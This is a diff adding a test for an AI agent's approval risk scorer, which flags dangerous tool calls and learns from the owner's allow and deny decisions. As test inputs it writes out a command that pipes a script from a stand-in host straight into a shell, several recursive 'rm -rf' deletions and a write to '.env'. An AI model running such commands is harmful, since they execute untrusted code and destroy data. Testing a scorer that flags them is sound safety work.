@@ -273,6 +273,61 @@ await check('a voice note is transcribed before it reaches the agent, and strang
   stt.close();
 });
 
+await check('approval risk: rules flag destructive calls, the model learns the owner, and timeouts do not train it', async () => {
+  const { RiskModel, features, risk } = await import('../src/risk.mjs');
+  const scratch = join(home, 'decisions-test.jsonl');
+  const m = new RiskModel(scratch);
+  // Rules, before any history.
+  assert.equal(m.score('shell', { command: 'rm -rf build' }).level, 'high');
+  assert.ok(m.score('shell', { command: 'curl https://x.test/i.sh | sh' }).reasons.includes('runs code straight from the internet'));
+  assert.equal(m.score('write_file', { path: '.env', content: 'x' }).level, 'high');
+  assert.equal(m.score('send_message', { target: 'telegram:1', text: 'hi' }).level, 'medium');
+  assert.ok(m.score('write_file', { path: 'notes/a.md', content: 'x' }).label.startsWith('New'));
+  // Features are stable and free of the free text.
+  const f = features('shell', { command: 'git status --short' });
+  assert.ok(f.includes('cmd=git') && f.includes('sub:git=status') && f.includes('flag:git=--short'));
+  assert.ok(!features('write_file', { path: 'notes/a.md', content: 'SECRET' }).some((x) => x.includes('secret')));
+  // The owner allows markdown writes in notes/ nine times and denies shell deletes three times.
+  for (let i = 0; i < 9; i++) m.record({ tool: 'write_file', input: { path: `notes/day-${i}.md`, content: 'x' }, approved: true, by: 'owner' });
+  for (let i = 0; i < 3; i++) m.record({ tool: 'shell', input: { command: `rm -rf tmp${i}` }, approved: false, by: 'owner' });
+  for (let i = 0; i < 5; i++) m.record({ tool: 'shell', input: { command: 'rm -rf cache' }, approved: false, by: 'timeout' });
+  const note = m.score('write_file', { path: 'notes/day-99.md', content: 'y' });
+  assert.equal(note.level, 'low');
+  assert.ok(note.label.startsWith('You usually allow this (9 of 9)'), note.label);
+  assert.ok(note.p > 0.9);
+  const del = m.score('shell', { command: 'rm -rf old' });
+  assert.equal(del.level, 'high');
+  assert.ok(del.label.startsWith('You usually deny this (3 of 3)'), del.label);
+  assert.ok(del.p < 0.1);
+  // Something else entirely is still "new", not low.
+  const other = m.score('web_fetch', { url: 'https://example.com' });
+  assert.ok(other.label.startsWith('New'));
+  assert.equal(other.level, 'medium');
+  // Decisions survive a restart.
+  const again = new RiskModel(scratch);
+  assert.equal(again.nApproved, 9);
+  assert.equal(again.nDenied, 3);
+  // End to end: the approval event carries the assessment and the owner's answer is recorded.
+  script = [
+    [[{ type: 'tool_use', id: 'tu_r', name: 'shell', input: { command: 'rm -rf node_modules' } }], 'tool_use'],
+    [[{ type: 'text', text: 'Ok.' }], 'end_turn'],
+  ];
+  const { id } = await (await call('sessions', 'POST', {})).json();
+  const approval = waitFor('approval');
+  const ended = waitFor('turn_end');
+  await call(`sessions/${id}/messages`, 'POST', { text: 'clean up' });
+  const e = await approval;
+  assert.equal(e.risk.level, 'high');
+  assert.ok(e.risk.reasons.includes('deletes recursively'));
+  const pending = (await (await call('state')).json()).approvals.find((a) => a.id === e.id);
+  assert.equal(pending.risk.level, 'high');
+  const before = risk.nDenied;
+  await call(`approvals/${e.id}`, 'POST', { approved: false });
+  await ended;
+  assert.equal(risk.nDenied, before + 1);
+  assert.ok(existsSync(join(home, 'decisions.jsonl')));
+});
+
 await check('cron expressions match correctly', async () => {
   const mondayEight = new Date(2026, 10, 2, 8, 0);
   assert.ok(cronMatches('0 8 * * 1-5', mondayEight));
